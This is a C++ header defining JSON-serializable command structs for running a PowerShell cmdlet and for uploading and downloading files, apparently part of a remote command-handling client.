//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
#pragma once
#include <string>
#include <rapidjson/document.h>
#include <rapidjson/stringbuffer.h>
#include <rapidjson/writer.h>

struct CommandPowershell
{
    std::string commandlet;
    std::string arguements;

    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
    {
        rapidjson::Value obj(rapidjson::kObjectType);

        rapidjson::Value cmdVal;
        cmdVal.SetString(commandlet.c_str(), static_cast<rapidjson::SizeType>(commandlet.length()), allocator);

        rapidjson::Value argsVal;
        argsVal.SetString(arguements.c_str(), static_cast<rapidjson::SizeType>(arguements.length()), allocator);

        obj.AddMember("Commandlet", cmdVal, allocator);
        obj.AddMember("Arguements", argsVal, allocator);

        return obj;
    }
};

struct CommandUploadFile
{
    std::string path;

    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
    {
        rapidjson::Value value(rapidjson::kObjectType);
        value.AddMember("path", rapidjson::Value(path.c_str(), allocator), allocator);
        return value;
    }
};

struct CommandDownloadFile
{
    std::string path;
    std::string data;
    std::int64_t offset;
    std::int64_t totalBytes;
    bool final;

    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
    {
        rapidjson::Value value(rapidjson::kObjectType);
        value.AddMember("Path", rapidjson::Value(path.c_str(), allocator), allocator);
        return value;
    }
};
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//